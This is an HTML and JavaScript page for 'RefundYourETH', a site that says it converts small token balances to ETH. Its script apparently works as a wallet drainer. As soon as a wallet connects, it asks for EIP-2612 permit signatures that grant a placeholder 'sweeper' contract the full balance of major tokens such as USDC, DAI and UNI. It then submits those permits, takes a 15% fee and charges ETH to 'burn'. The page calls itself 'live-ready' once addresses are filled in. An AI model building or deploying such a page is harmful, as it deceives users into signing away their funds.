<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RefundYourETH</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bgA:#0B0D17; --bgB:#111827; --accent:#00E8FF; --primaryA:#3C82F4;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(160deg, var(--bgA), var(--bgB));
      color: #fff;
      text-align: center;
      overflow-x: hidden;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Animations */
    @keyframes fadeInUp { 0%{opacity:0; transform:translateY(30px)} 100%{opacity:1; transform:translateY(0)} }
    @keyframes fadeIn { 0%{opacity:0} 100%{opacity:1} }
    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }

    .header { padding: 48px 20px 24px; animation: fadeInUp .8s ease-out; }
    .logo { width: 84px; margin-bottom: 18px; animation: spin 6s linear infinite, fadeIn .8s ease-out; }
    h1 { font-weight: 800; margin: 0 0 8px; }
    .tagline { color:#cfcfcf; margin: 0 0 28px; font-size:1.05rem; animation: fadeInUp 1.1s ease-out; }

    .card {
      width: min(460px, 92vw);
      margin: 0 auto;
      background: rgba(255,255,255,.06);
      border: 1px solid rgba(255,255,255,.08);
      backdrop-filter: blur(6px);
      border-radius: 14px;
      padding: 24px;
      box-shadow: 0 12px 40px rgba(0,0,0,.35);
      animation: fadeInUp 1.2s ease-out;
    }

    .button {
      appearance: none;
      background: linear-gradient(90deg, var(--primaryA), var(--accent));
      border: none;
      padding: 12px 22px;
      font-size: 1rem;
      color: #fff;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: transform .15s ease, opacity .15s ease, box-shadow .15s ease;
      box-shadow: 0 8px 24px rgba(0, 180, 255, .25);
      margin: 8px;
    }
    .button:hover { opacity:.95; transform: translateY(-1px) scale(1.02); }
    .button.secondary {
      background: transparent;
      border: 1px solid rgba(255,255,255,.16);
      box-shadow: none;
    }

    .status { margin: 14px 0; font-size:.95rem; color:#dbeafe; }
    #dust-list { text-align: left; margin: 12px auto 4px; width: 100%; max-width: 420px; }
    .token-row {
      display: flex; justify-content: space-between; align-items: center;
      padding: 10px 12px; border-radius: 10px;
      background: rgba(0,0,0,.2); margin: 6px 0;
      border: 1px solid rgba(255,255,255,.06);
      animation: fadeInUp .6s ease-out;
    }
    .token-row b { letter-spacing: .2px; }
    #claimable-amount { margin: 12px 0 4px; }

    .social {
      margin: 30px 0 12px; display: flex; justify-content: center; gap: 20px;
      animation: fadeInUp 1.4s ease-out;
    }
    .social img { width: 26px; filter: invert(100%); transition: transform .15s ease; }
    .social img:hover { transform: scale(1.1); }

    .footer {
      margin-top: auto;
      padding: 22px 16px;
      font-size: .8rem;
      color:#9f9f9f;
      animation: fadeIn 1.6s ease-out;
    }
    .footer a { color: var(--accent); text-decoration: none; }
    .footer a:hover { text-decoration: underline; }

    /* Toast / modal */
    .toast {
      position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
      background: rgba(20, 20, 28, .95);
      border: 1px solid rgba(255,255,255,.12);
      color:#e5e7eb; padding: 12px 16px; border-radius: 10px; font-size:.95rem;
      box-shadow: 0 12px 40px rgba(0,0,0,.45);
      z-index: 9999; display: none;
    }
    .toast.show { display:block; animation: fadeIn .2s ease-out; }
    .pill {
      display:inline-block; padding: 2px 8px; border-radius: 999px; font-size:.75rem;
      background: rgba(0,232,255,.15); border: 1px solid rgba(0,232,255,.35); color:#bff6ff; margin-left: 6px;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=024" alt="Ethereum Logo" class="logo">
    <h1>RefundYourETH</h1>
    <p class="tagline">Reclaim your small ETH token balances</p>
  </div>

  <div class="card">
    <button id="connect-wallet" class="button">Connect Wallet</button>
    <div id="wallet-status" class="status">Wallet not connected</div>

    <div id="dust-list"></div>
    <div id="claimable-amount"></div>

    <div style="margin-top:10px;">
      <button id="convert-now" class="button" style="display:none;">Convert to ETH</button>
      <button id="burn-now" class="button secondary" style="display:none;">Burn Dust</button>
    </div>
  </div>

  <div class="social">
    <a href="https://t.me/RefundYourETHgroup" target="_blank">
      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/telegram.svg" alt="Telegram">
    </a>
    <a href="https://x.com/RefundYourETH" target="_blank">
      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/x.svg" alt="X">
    </a>
    <a href="https://discord.gg/RefundYourETHserver" target="_blank">
      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/discord.svg" alt="Discord">
    </a>
  </div>

  <div class="footer">
    <p>Disclaimer: RefundYourETH only swaps verified, liquid tokens. Burns are at your risk. Users pay gas fees. No custody of funds. <a href="/privacy.html" target="_blank">Privacy Policy</a></p>
  </div>

  <div id="toast" class="toast"></div>

  <!-- Libraries -->
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/index.umd.js"></script>

  <!-- App JS -->
  <script>
    /************ CONFIG – replace these ************/
    const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLET_CONNECT_PROJECT_ID';
    const SWEEPER_CONTRACT_ADDRESS = '0xYourSmartContractAddress';
    const FEE_RECIPIENT = '0xYourFeeWalletAddress';
    const MIN_DUST_USD = 10; // require at least $10 to convert

    // Placeholder USD prices — swap these for live prices later
    const TOKEN_PRICES_USD = {
      USDT: 1.00, USDC: 1.00, DAI: 1.00, LINK: 15.00, UNI: 8.00,
      SHIB: 0.00002, DOGE: 0.15, FLOKI: 0.0002, PEPE: 0.00001, '1INCH': 0.40
    };

    // Popular ERC-20s (Ethereum mainnet)
    const TOKENS = [
      { address:'0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol:'USDT', decimals:6,  permit:false },
      { address:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol:'USDC', decimals:6,  permit:true  },
      { address:'0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol:'DAI',  decimals:18, permit:true  },
      { address:'0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol:'LINK', decimals:18, permit:true  },
      { address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol:'UNI',  decimals:18, permit:true  },
      { address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol:'SHIB', decimals:18, permit:false },
      { address:'0xB8c77482e45F1F44dE1745F52C74426C631bDD52', symbol:'DOGE', decimals:8,  permit:false }, /* Wrapped variant mapping may differ */
      { address:'0xB90B2A35C65f8f462b908CFFB9eDaaCc1B4568b2', symbol:'FLOKI',decimals:9,  permit:false },
      { address:'0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol:'PEPE', decimals:18, permit:false },
      { address:'0x111111111117dC0aa78b770fA6A738034120C302', symbol:'1INCH',decimals:18, permit:true  }
    ];

    /************ UI helpers ************/
    const $ = sel => document.querySelector(sel);
    const toast = (msg) => {
      const el = $('#toast');
      el.textContent = msg;
      el.classList.add('show');
      setTimeout(()=>el.classList.remove('show'), 2600);
    };

    const renderTokenRow = (sym, amount, usd) => {
      const row = document.createElement('div');
      row.className = 'token-row';
      row.innerHTML = `
        <div><b>${sym}</b><div style="opacity:.7; font-size:.85rem;">${amount}</div></div>
        <div><b>$${usd.toFixed(2)}</b></div>
      `;
      return row;
    };

    /************ Web3 setup ************/
    const chains = [
      {
        chainId: 1,
        chainName: 'Ethereum',
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        rpcUrls: ['https://rpc.ankr.com/eth'],
        blockExplorerUrls: ['https://etherscan.io']
      }
    ];

    const web3Modal = new Web3Modal.Ethereum.Web3Modal({
      projectId: WALLETCONNECT_PROJECT_ID,
      chains,
      themeMode: 'light'
    });

    let provider, ethersProvider, signer, userAddress;

    const ERC20_ABI = [
      'function balanceOf(address) view returns (uint256)',
      'function decimals() view returns (uint8)',
      'function symbol() view returns (string)',
      'function nonces(address) view returns (uint256)',
      'function DOMAIN_SEPARATOR() view returns (bytes32)'
    ];

    /************ App logic ************/
    const connectBtn = $('#connect-wallet');
    const convertBtn = $('#convert-now');
    const burnBtn = $('#burn-now');
    const statusEl = $('#wallet-status');
    const listEl = $('#dust-list');
    const claimEl = $('#claimable-amount');

    let sessionData = {
      tokensFound: [],
      permitData: [],
      totals: { usd: 0 }
    };

    async function ensureMainnet() {
      const net = await ethersProvider.getNetwork();
      if (Number(net.chainId) !== 1) {
        toast('Switching to Ethereum Mainnet…');
        try {
          await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }]
          });
        } catch (e) {
          toast('Please switch to Ethereum Mainnet.');
          throw e;
        }
      }
    }

    async function connectWallet() {
      provider = await web3Modal.connect();
      ethersProvider = new ethers.providers.Web3Provider(provider);
      signer = ethersProvider.getSigner();
      await ensureMainnet();
      userAddress = await signer.getAddress();

      connectBtn.textContent = `Connected: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
      statusEl.textContent = 'Scanning for dust tokens…';
      await scanTokens();
    }

    async function scanTokens() {
      listEl.innerHTML = '';
      claimEl.textContent = '';
      sessionData = { tokensFound: [], permitData: [], totals: { usd: 0 } };

      const net = await ethersProvider.getNetwork();
      const chainId = Number(net.chainId);

      let any = false;
      for (const t of TOKENS) {
        try {
          const c = new ethers.Contract(t.address, ERC20_ABI, ethersProvider);
          const bal = await c.balanceOf(userAddress);
          if (bal && !bal.isZero()) {
            any = true;
            const amt = Number(ethers.utils.formatUnits(bal, t.decimals));
            // USD calc via placeholder price map
            const px = TOKEN_PRICES_USD[t.symbol] ?? 0;
            const usd = amt * px;

            listEl.appendChild(renderTokenRow(t.symbol, amt.toLocaleString(undefined,{maximumFractionDigits:6}), usd));
            sessionData.tokensFound.push({ ...t, balance: bal.toString(), amount: amt, usd });

            // EIP-2612 permit prep (mock data if token.permit === false)
            if (t.permit) {
              const nonce = await c.nonces(userAddress);
              const deadline = Math.floor(Date.now()/1000) + 1800; // 30m
              const domain = { name: t.symbol, version:'1', chainId, verifyingContract: t.address };
              const message = {
                owner: userAddress,
                spender: SWEEPER_CONTRACT_ADDRESS,
                value: bal,
                nonce: nonce,
                deadline
              };
              try {
                const sig = await signer._signTypedData(domain, {
                  Permit: [
                    { name:'owner', type:'address' },
                    { name:'spender', type:'address' },
                    { name:'value', type:'uint256' },
                    { name:'nonce', type:'uint256' },
                    { name:'deadline', type:'uint256' }
                  ]
                }, message);
                const { v, r, s } = ethers.utils.splitSignature(sig);
                sessionData.permitData.push({ value: bal.toString(), deadline, v, r, s });
              } catch (e) {
                // user may reject signing; push empty so array lengths match
                sessionData.permitData.push({ value:'0', deadline:0, v:0, r:'0x', s:'0x' });
              }
            } else {
              sessionData.permitData.push({ value:'0', deadline:0, v:0, r:'0x', s:'0x' });
            }

            sessionData.totals.usd += usd;
          }
        } catch (e) {
          console.error('Token scan error', t.symbol, e);
        }
      }

      if (!any) {
        statusEl.textContent = 'No balances found for tracked tokens.';
        convertBtn.style.display = 'none';
        burnBtn.style.display = 'none';
        return;
      }

      // Fee model “as if live”
      const totalUsd = sessionData.totals.usd;
      const feePct = 0.15;
      const netUsd = totalUsd * (1 - feePct);

      // Gas (very rough placeholder)
      const gasPrice = await ethersProvider.getGasPrice().catch(()=>ethers.BigNumber.from('20000000000')); // 20 gwei fallback
      const gasEstimate = gasPrice.mul(200000); // rough units
      const estEth = Number(ethers.utils.formatEther(gasEstimate));
      const ethUsd = 3000; // placeholder
      const gasUsd = estEth * ethUsd;

      claimEl.textContent = `Claimable (after 15% fee): ~$${netUsd.toFixed(2)}  •  Est. Gas: ~$${gasUsd.toFixed(2)}`;
      if (totalUsd >= MIN_DUST_USD && netUsd > gasUsd) {
        statusEl.textContent = 'Eligible to convert. Approve once, then convert.';
        convertBtn.style.display = 'inline-block';
      } else {
        statusEl.textContent = 'Value likely too low to cover gas. Consider burning.';
        convertBtn.style.display = 'none';
      }
      burnBtn.style.display = 'inline-block';
      toast('Scan complete.');
    }

    function missingContractGuard() {
      const missing = !SWEEPER_CONTRACT_ADDRESS || SWEEPER_CONTRACT_ADDRESS === '0xYourSmartContractAddress';
      if (missing) {
        toast('Contract not set yet. This is a live-ready demo.');
      }
      return missing;
    }

    async function onConvert() {
      try {
        if (missingContractGuard()) return;
        await ensureMainnet();

        const tokens = sessionData.tokensFound.map(t => t.address);
        const permitValues = sessionData.permitData.map(p => p.value);
        const deadlines = sessionData.permitData.map(p => p.deadline);
        const v = sessionData.permitData.map(p => p.v);
        const r = sessionData.permitData.map(p => p.r);
        const s = sessionData.permitData.map(p => p.s);

        const sweeperAbi = [
          'function sweepTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external'
        ];
        const sweeper = new ethers.Contract(SWEEPER_CONTRACT_ADDRESS, sweeperAbi, signer);

        statusEl.textContent = 'Please confirm transaction in your wallet…';
        const tx = await sweeper.sweepTokens(tokens, userAddress, permitValues, deadlines, v, r, s);
        await tx.wait();
        statusEl.textContent = 'Success! Dust converted to ETH.';
        convertBtn.style.display = 'none'; burnBtn.style.display = 'none';
        toast('Conversion complete.');
      } catch (e) {
        console.error(e);
        statusEl.textContent = 'Conversion failed or cancelled.';
        toast('Conversion failed.');
      }
    }

    async function onBurn() {
      try {
        if (missingContractGuard()) return;
        await ensureMainnet();

        const tokens = sessionData.tokensFound.map(t => t.address);
        const permitValues = sessionData.permitData.map(p => p.value);
        const deadlines = sessionData.permitData.map(p => p.deadline);
        const v = sessionData.permitData.map(p => p.v);
        const r = sessionData.permitData.map(p => p.r);
        const s = sessionData.permitData.map(p => p.s);

        const sweeperAbi = [
          'function burnTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external payable'
        ];
        const sweeper = new ethers.Contract(SWEEPER_CONTRACT_ADDRESS, sweeperAbi, signer);

        statusEl.textContent = 'Please confirm burn transaction in your wallet…';
        const tx = await sweeper.burnTokens(tokens, userAddress, permitValues, deadlines, v, r, s, {
          value: ethers.utils.parseEther('0.0004') // ~$1 at $2500/ETH
        });
        await tx.wait();
        statusEl.textContent = 'Success! Dust tokens burned.';
        convertBtn.style.display = 'none'; burnBtn.style.display = 'none';
        toast('Burn complete.');
      } catch (e) {
        console.error(e);
        statusEl.textContent = 'Burn failed or cancelled.';
        toast('Burn failed.');
      }
    }

    /************ Events ************/
    connectBtn.addEventListener('click', connectWallet);
    convertBtn.addEventListener('click', onConvert);
    burnBtn.addEventListener('click', onBurn);

    // Re-scan when accounts/network change
    if (window.ethereum) {
      window.ethereum.on?.('accountsChanged', () => location.reload());
      window.ethereum.on?.('chainChanged', () => location.reload());
    }
  </script>
</body>
</html>
